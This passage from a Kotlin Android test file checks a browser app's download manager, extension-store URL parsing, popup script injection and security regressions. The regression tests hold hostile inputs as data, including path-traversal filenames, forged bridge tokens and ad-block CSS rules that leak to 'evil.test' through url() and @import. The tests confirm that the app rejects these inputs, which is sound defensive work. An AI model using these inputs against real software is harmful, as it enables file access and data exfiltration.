                                versionName = "1.2.0",
                                versionCode = 12L,
                                securityNotice = "Valid APK structure verified.",
                                appIcon = ownerBitmap
                            )
                        )
                    },
                    onOpenHtmlPreview = { entity -> openedHtmlEntity = entity }
                )
            }
        }
        composeRule.waitForIdle()

        // Tap APK row -> shows Install / Cancel confirmation dialog with embedded APK owner icon
        composeRule.onNodeWithTag("download_file_row_11").performClick()
        composeRule.waitForIdle()
        composeRule.onNodeWithText("Install Sample App?").assertIsDisplayed()
        composeRule.onNodeWithTag("apk_install_dialog_icon").assertIsDisplayed()
        composeRule.onNodeWithText("Package: com.example.sample\nVersion: 1.2.0 (12)", substring = true)

        // Tap Cancel -> dialog closes without starting installer
        composeRule.onNodeWithTag("apk_install_cancel").performClick()
        composeRule.waitForIdle()
        assertEquals(0, openedApkIntentCount)

        // Tap APK row again and confirm Install -> triggers installer intent
        composeRule.onNodeWithTag("download_file_row_11").performClick()
        composeRule.waitForIdle()
        composeRule.onNodeWithTag("apk_install_confirm").performClick()
        composeRule.waitForIdle()
        assertEquals(1, openedApkIntentCount)

        // Tap HTML row -> opens HTML file preview in new tab
        composeRule.onNodeWithTag("download_file_row_12").performClick()
        composeRule.waitForIdle()
        assertNotNull(openedHtmlEntity)
        assertEquals(12L, openedHtmlEntity?.id)
    }

    @Test
    fun extensionStoreDetectionAndCrxUrlExtraction_handlesChromeAndEdgeStores() {
        assertTrue(ExtensionEngine.isExtensionStoreUrl("https://chromewebstore.google.com/detail/dark-reader/eimadpbcbfnmbkopoojfekhnkhdbieeh"))
        assertTrue(ExtensionEngine.isExtensionStoreUrl("https://chrome.google.com/webstore/category/extensions"))
        assertTrue(ExtensionEngine.isExtensionStoreUrl("https://microsoftedge.microsoft.com/addons/detail/ublock-origin/odfafepnkmbhccpbejgmiehpchacaeak"))
        assertTrue(ExtensionEngine.isExtensionStoreUrl("https://microsoftedge.microsoft.com/en-us/addons/detail/ublock-origin/odfafepnkmbhccpbejgmiehpchacaeak"))
        assertTrue(ExtensionEngine.isExtensionStoreUrl("https://clients2.google.com/service/update2/crx?x=id%3Deimadpbcbfnmbkopoojfekhnkhdbieeh"))
        assertTrue(ExtensionEngine.isExtensionStoreUrl("https://edge.microsoft.com/extensionwebstorebase/v1/crx"))
        assertTrue(ExtensionEngine.isExtensionStoreUrl("https://support.google.com/chrome_webstore/answer/2664769"))
        assertFalse(ExtensionEngine.isExtensionStoreUrl("https://github.com/extensions"))

        val cwsRef = ExtensionEngine.extractStoreExtensionDownload(
            "https://chromewebstore.google.com/detail/dark-reader/eimadpbcbfnmbkopoojfekhnkhdbieeh"
        )
        assertNotNull(cwsRef)
        assertEquals("Chrome Web Store", cwsRef?.storeName)
        assertEquals("eimadpbcbfnmbkopoojfekhnkhdbieeh", cwsRef?.extensionId)
        assertTrue(cwsRef?.crxDownloadUrl?.startsWith("https://clients2.google.com/service/update2/crx") == true)

        val edgeRef = ExtensionEngine.extractStoreExtensionDownload(
            "https://microsoftedge.microsoft.com/en-us/addons/detail/ublock-origin/odfafepnkmbhccpbejgmiehpchacaeak"
        )
        assertNotNull(edgeRef)
        assertEquals("Microsoft Edge Add-ons", edgeRef?.storeName)
        assertEquals("odfafepnkmbhccpbejgmiehpchacaeak", edgeRef?.extensionId)
        assertTrue(edgeRef?.crxDownloadUrl?.startsWith("https://edge.microsoft.com/extensionwebstorebase/v1/crx") == true)

        assertNull(ExtensionEngine.extractStoreExtensionDownload("https://chromewebstore.google.com"))
    }

    @Test
    fun popupChromeRuntimeInjection_andForceExecutionHonorEnabledAndIntegrity() {
        val rawHtml = "<!doctype html><html><head><title>Popup</title></head><body><script src='popup.js'></script></body></html>"
        val script = "document.title = 'Updated by Ext';"
        val hash = ExtensionEngine.computeExtensionHash(script, "")
        val ext = ExtensionEntity(
            id = 88L,
            profileId = 1L,
            extId = "webext.sample_popup.1",
            name = "Sample Popup Ext",
            version = "1.0",
            description = "Popup ext",
            sourceType = "WEBEXT_ZIP",
            enabled = true,
            permissionsJson = """["cookies","tabs","storage"]""",
            matchPatternsJson = """["<all_urls>"]""",
            hasPopup = true,
            popupPath = "popup.html",
            scriptContent = script,
            contentHashSha256 = hash
        )

        val injected = String(
            extensionEngine.injectPopupChromeRuntimeHtml(
                rawHtmlBytes = rawHtml.toByteArray(Charsets.UTF_8),
                ext = ext,
                activeTabUrl = "https://example.com/profile",
                activeTabTitle = "Example Profile"
            ),
            Charsets.UTF_8
        )
        assertTrue(injected.contains("window.__weblioPopupChromeReady"))
        assertTrue(injected.contains("example.com"))
        assertTrue(injected.contains("Example Profile"))
        assertTrue(injected.contains("WeblioPopupBridge.getCookiesJson"))
        assertTrue(injected.indexOf("__weblioPopupChromeReady") < injected.indexOf("popup.js"))

        val payload = extensionEngine.buildForceExecutionPayload(ext)
        assertTrue(payload.contains("Updated by Ext"))

        // Disabled or tampered extensions must never produce an execution payload
        assertEquals("", extensionEngine.buildForceExecutionPayload(ext.copy(enabled = false)))
        assertEquals("", extensionEngine.buildForceExecutionPayload(ext.copy(scriptContent = "evil()")))
    }

    @Test
    fun `24_security regression tests validate confinement, bridge tokens, integrity, and sanitization`() = runBlocking {
        // 1. ExtensionEngine.resolveConfinedFile blocks path traversal
        val extRoot = File(tempWorkDir, "ext_root").apply { mkdirs() }
        val outsideSecret = File(tempWorkDir, "secret.txt").apply { writeText("top-secret") }
        assertNull(ExtensionEngine.resolveConfinedFile(extRoot, "../secret.txt"))
        assertNull(ExtensionEngine.resolveConfinedFile(extRoot, "sub/../../secret.txt"))
        assertTrue(outsideSecret.exists())

        // 2. Blank SHA-256 content hash fails integrity verification (fail-closed)
        val noHashExt = ExtensionEntity(
            id = 91L,
            profileId = 1L,
            extId = "ext.nohash",
            name = "NoHash",
            version = "1.0",
            description = "Test",
            sourceType = "USERSCRIPT",
            enabled = true,
            permissionsJson = "[]",
            matchPatternsJson = """["<all_urls>"]""",
            scriptContent = "console.log(1);",
            contentHashSha256 = ""
        )
        assertFalse(ExtensionEngine.verifyExtensionIntegrity(noHashExt))

        // 3. WeblioExtBridge enforces per-session bridge token on storage & error reporting
        var reportedErr: String? = null
        val bridge = extensionEngine.createJsBridge { _, err -> reportedErr = err }
        bridge.setValue(extensionEngine.sessionBridgeToken, "ext.bridge.test", "k1", "\"v1\"")
        assertEquals("\"v1\"", bridge.getValue(extensionEngine.sessionBridgeToken, "ext.bridge.test", "k1"))
        assertNull(bridge.getValue("forged_page_token", "ext.bridge.test", "k1"))
        bridge.setValue("forged_page_token", "ext.bridge.test", "k1", "\"pwned\"")
        assertEquals("\"v1\"", bridge.getValue(extensionEngine.sessionBridgeToken, "ext.bridge.test", "k1"))
        bridge.reportError("forged_page_token", "ext.bridge.test", "fake error")
        assertNull(reportedErr)

        // 4. Download filename sanitization & canonical directory confinement
        val sanitizedTraversal = WeblioDownloadManager.sanitizeFileName("../../evil/..payload.apk")
        assertFalse(sanitizedTraversal.contains(".."))
        assertFalse(sanitizedTraversal.contains("/"))
        assertFalse(sanitizedTraversal.startsWith("."))
        assertFalse(WeblioDownloadManager.sanitizeFileName("..").contains(".."))

        val dm = WeblioDownloadManager(context, repository, quarantineManager, scanner)
        val outsideFile = File(tempWorkDir, "outside.apk").apply { writeText("outside") }
        val outsideEntity = DownloadEntity(
            id = 500L,
            profileId = 1L,
            url = "https://example.com/outside.apk",
            fileName = "outside.apk",
            mimeType = "application/vnd.android.package-archive",
            category = DownloadFileCategory.APK.name,
            localPath = outsideFile.absolutePath,
            status = DownloadStatus.COMPLETED.name,
            quarantined = false
        )
        assertTrue(dm.inspectApkForInstall(outsideEntity).isFailure)
        assertTrue(dm.openDownloadedFile(outsideEntity).isFailure)

        val destInDownloads = File(quarantineManager.downloadsDir, "escaped.txt")
        assertTrue(quarantineManager.promoteToDestination(outsideFile, destInDownloads).isFailure)

        // 5. AdBlock cosmetic CSS injection prevention & DoH HTTPS enforcement
        repository.addAdBlockRule("##.safe-ad-banner", FilterRuleType.COSMETIC_HIDE)
        repository.addAdBlockRule("##.evil { background: url(https://evil.test/leak); }", FilterRuleType.COSMETIC_HIDE)
        repository.addAdBlockRule("##@import url(https://evil.test/x.css)", FilterRuleType.COSMETIC_HIDE)
        val adBlockEngine = AdBlockEngine(repository)
        // Wait briefly for init flow collection
        kotlinx.coroutines.delay(150)
        val css = adBlockEngine.buildCosmeticCss(siteAdBlockEnabled = true)
        assertTrue(css.contains(".safe-ad-banner"))
        assertFalse(css.contains("evil.test"))
        assertFalse(css.contains("@import"))
        assertNull(adBlockEngine.queryDoh("http://insecure-doh.example/dns-query", byteArrayOf(0x01, 0x02)))
    }
}
